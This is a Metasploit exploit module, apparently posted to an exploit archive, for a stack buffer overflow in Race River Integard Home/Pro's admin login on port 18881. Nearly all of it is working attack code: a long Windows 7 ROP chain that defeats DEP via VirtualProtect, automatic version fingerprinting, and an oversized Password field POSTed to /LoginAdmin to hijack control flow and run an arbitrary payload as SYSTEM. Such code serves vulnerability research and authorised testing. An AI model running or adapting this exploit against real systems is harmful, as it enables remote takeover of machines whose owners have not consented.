Integard Pro 2.2.0.9026 (Win7 ROP-Code Metasploit Module)
=========================================================

# Exploit Title: Integard Pro 2.2.0.9026 (Win7 ROP-Code Metasploit Module)
# Date: 2010-09-15
# Author: Node
# Software Link: http://www.exploit-db.com/application/14941
# Version: Race River Integard Pro 2.2.0.9026, integard32.dll(v.2.0.0.306)
# Tested on: Windows 7 x64 Eng
# CVE : -
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking # stack bof, seh, universal ret, auto targeting
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Race River Integard Home/Pro LoginAdmin Password Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                        This module exploits a stack buffer overflow in Race river&#039;s Integard Home/Pro
                    internet content filter HTTP Server. Versions prior to 2.0.0.9037 and 2.2.0.9037 are
                    vulnerable.
 
                    The administration web page on port 18881 is vulnerable to a remote buffer overflow
                    attack. By sending an long character string in the password field, both the structured
                    exception handler and the saved extended instruction pointer are over written, allowing
                    an attacker to gain control of the application and the underlying operating system
                    remotely.
 
                    The administration website service runs with SYSTEM privileges, and automatically
                    restarts when it crashes.
            },
            &#039;Author&#039;  =>
                [
                    &#039;Lincoln&#039;, # original discovery
                    &#039;Nullthreat&#039;,
                    &#039;rick2600&#039;,
                    &#039;corelanc0d3r&#039;,
                    &#039;jduck&#039;, # fleshed out module from advisory
                    &#039;Node&#039; # Win7 rop-code
                ],
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Version&#039;       => &#039;$Revision: 99999 $&#039;,
            &#039;References&#039;    =>
                [
                    [&#039;OSVDB&#039;, &#039;67909&#039;],
                    [&#039;URL&#039;,&#039;http://www.corelan.be:8800/advisories.php?id=CORELAN-10-061&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039;  => "\x00\x20\x26\x2f\x3d\x3f\x5c",
                    &#039;StackAdjustment&#039; => -1500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Privileged&#039;     => false,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic Targeting&#039;,          { &#039;auto&#039; => true }],
                    [ &#039;Integard Home 2.0.0.9021&#039;, { &#039;Ret&#039; => 0x0041565E,}], # p/p/r
                    [ &#039;Integard Pro  2.2.0.9026&#039;, { &#039;Ret&#039; => 0x0040362C,}], # p/p/r
                    [ &#039;Integard Pro  2.2.0.9026, integard32.dll(v.2.0.0.306) (Windows 7 x64 Eng)&#039;, { &#039;Win7&#039; => true,}]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Sep 07 2010&#039;))
 
        register_options(
            [
                Opt::RPORT(18881)
            ], self.class )
    end
 
    def exploit
 
        rop = [0x10010793].pack(&#039;V&#039;) # RET
        rop << rand_text_alpha_upper(20)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << [0xFFB8A378].pack(&#039;V&#039;) # PUSH ESP # SUB EAX,20 # POP EBX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x100111B7].pack(&#039;V&#039;)  # ADD ESP,2C # POP ESI # POP EBP # RETN
        rop << "1111" #VirtualProtect placeholder
        rop << "2222" #return address placeholder
        rop << "3333" #lpAddress placeholder
        rop << "4444" #dwsize placeholder
        rop << "5555" #flNewProtect placeholder
        rop << [0x10019005].pack(&#039;V&#039;) # writable
        rop << rand_text_alpha_upper(28)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << [0xFFBBA5CE].pack(&#039;V&#039;) # INC EBX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x10010EB5].pack(&#039;V&#039;)  # POP EDI # POP ESI # RETN
        rop << [0x10019005].pack(&#039;V&#039;) # writable
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << [0xFFB95B6F].pack(&#039;V&#039;)  # PUSH EBX # SBB BYTE PTR DS:[EDI+5E],BL # POP EBP # MOV EAX,-2 # POP EBX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << [0xFFFFF41C].pack(&#039;V&#039;) #length to kernel32
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C6B].pack(&#039;V&#039;)  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100107E8].pack(&#039;V&#039;) # POP EAX # POP ESI # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xEFFF2E41].pack(&#039;V&#039;) # ADD EBX,EBP # RETN
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << [0xEFFF2E41].pack(&#039;V&#039;) # ADD EBX,EBP # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x10010C69].pack(&#039;V&#039;)  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xEFFFA79E].pack(&#039;V&#039;) # XCHG EAX,EBP # POP ESI # POP EBP # POP EDI # POP EBX # POP ECX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C6B].pack(&#039;V&#039;)  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFB81B31].pack(&#039;V&#039;) # MOV EAX,EDX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x100137AB].pack(&#039;V&#039;)  # MOV EAX,DWORD PTR DS:[EAX] # POP ESI # POP EBP # RETN
        rop << rand_text_alpha_upper(8)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C69].pack(&#039;V&#039;)  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFFFFE75].pack(&#039;V&#039;) # length to VP
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10013B9D].pack(&#039;V&#039;)  # MOV EAX,EBX # POP EBX # POP EBP # RETN
        rop << rand_text_alpha_upper(8)
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C6B].pack(&#039;V&#039;)  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFB81B31].pack(&#039;V&#039;)  # MOV EAX,EDX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10013B9D].pack(&#039;V&#039;)  # MOV EAX,EBX # POP EBX # POP EBP # RETN
        rop << rand_text_alpha_upper(8)
        rop << [0x1001072D].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
        rop << rand_text_alpha_upper(4)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x1001072D].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
        rop << rand_text_alpha_upper(4)
        rop << [0x10010C6B].pack(&#039;V&#039;)  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFFFF868].pack(&#039;V&#039;)  # length to shellcode
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C69].pack(&#039;V&#039;)  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFB81B31].pack(&#039;V&#039;)  # MOV EAX,EDX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x10010C69].pack(&#039;V&#039;)  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0x10010798].pack(&#039;V&#039;)  # ADD DWORD PTR DS:[EAX],EDX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x100137AB].pack(&#039;V&#039;)  # MOV EAX,DWORD PTR DS:[EAX] # POP ESI # POP EBP # RETN
        rop << rand_text_alpha_upper(8)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x1001072D].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
        rop << rand_text_alpha_upper(4)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C6B].pack(&#039;V&#039;)  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFFFFC18].pack(&#039;V&#039;)  # size (1000)
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10013B9D].pack(&#039;V&#039;) # MOV EAX,EBX # POP EBX # POP EBP # RETN
        rop << rand_text_alpha_upper(8)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x1001072D].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
        rop << rand_text_alpha_upper(4)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x100114C8].pack(&#039;V&#039;)  # ADD EAX,1 # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C6B].pack(&#039;V&#039;)  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFFFFFC0].pack(&#039;V&#039;)  # newprotect(0x40)
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10013B9D].pack(&#039;V&#039;) # MOV EAX,EBX # POP EBX # POP EBP # RETN
        rop << rand_text_alpha_upper(8)
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x1001072D].pack(&#039;V&#039;)  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
        rop << rand_text_alpha_upper(4)
        rop << [0x10010C6B].pack(&#039;V&#039;)  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFFFFFF0].pack(&#039;V&#039;) # length to saved VP on the stack
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10013B9D].pack(&#039;V&#039;) # MOV EAX,EBX # POP EBX # POP EBP # RETN
        rop << rand_text_alpha_upper(8)
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C6B].pack(&#039;V&#039;)  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xEFFF2818].pack(&#039;V&#039;)  # XCHG EAX,ESP # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10012EC7].pack(&#039;V&#039;)  # XCHG EAX,ECX # RETN
        rop << [0x10010C69].pack(&#039;V&#039;)  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
        rop << rand_text_alpha_upper(4)
        rop << [0x100106E6].pack(&#039;V&#039;)  # POP ECX # RETN
        rop << rand_text_alpha_upper(16)
        rop << [0xFFB81B31].pack(&#039;V&#039;)  # MOV EAX,EDX # RETN
        rop << [0x100109B0].pack(&#039;V&#039;)  # MOV EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x10010A2A].pack(&#039;V&#039;)  # SUB EAX,ECX # RETN
        rop << [0x1001274C].pack(&#039;V&#039;)  # CALL EAX # RETN
        rop << [0x10010F0B].pack(&#039;V&#039;)  # CALL EBX # ...
 
        mytarget = nil
        if (target[&#039;auto&#039;])
            print_status("Automatically detecting the target...")
            response = send_request_raw(
                {
                    &#039;uri&#039; => &#039;/banner.jpg&#039;,
                    &#039;version&#039; => &#039;1.1&#039;,
                    &#039;method&#039; => &#039;GET&#039;
                }, 5)
 
            case response[&#039;Content-Length&#039;].to_i
            when 24584
                print_status("[!] Found Version - Integard Home")
                mytarget = targets[1]
            when 23196
                mytarget = targets[2]
                print_status("[!] Found Version - Integard Pro")
            end
 
        else
            mytarget = target
        end
 
        if not mytarget
            raise RuntimeError, "Unable to automatically detect the target version"
        end
 
        print_status("Selected Target: #{mytarget.name}")
 
        print_status("Building Buffer")
        pay = payload.encoded
        if (target[&#039;Win7&#039;])
            buffer = rand_text_alpha_upper(832)
            buffer << rop
            buffer << rand_text_alpha_upper(2000 - rop.length)
            buffer << pay
            buffer << rand_text_alpha_upper(1000 - pay.length)
        else
 
            buffer = &#039;&#039;
            buffer << rand_text_alpha_upper(3091 - pay.length)
            buffer << pay
            buffer << "\xE9\x2B\xF8\xFF\xFF"
            buffer << "\xEB\xF9\x90\x90"
            buffer << [mytarget.ret].pack(&#039;V&#039;)
        end
            print_status("Sending Request")
            send_request_raw({
                    &#039;uri&#039; => &#039;/LoginAdmin&#039;,
                    &#039;version&#039; => &#039;1.1&#039;,
                    &#039;method&#039; => &#039;POST&#039;,
                    &#039;headers&#039; =>
                        {
                            &#039;Host&#039; => &#039;192.168.1.1:18881&#039;,
                            &#039;Content-Length&#039; => 1074
                        },
                    &#039;data&#039; => "Password=" + buffer + "&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=0&LoginButtonName=Login"
                }, 5)
 
            print_status("Request Sent")
 
            handler
    end
end



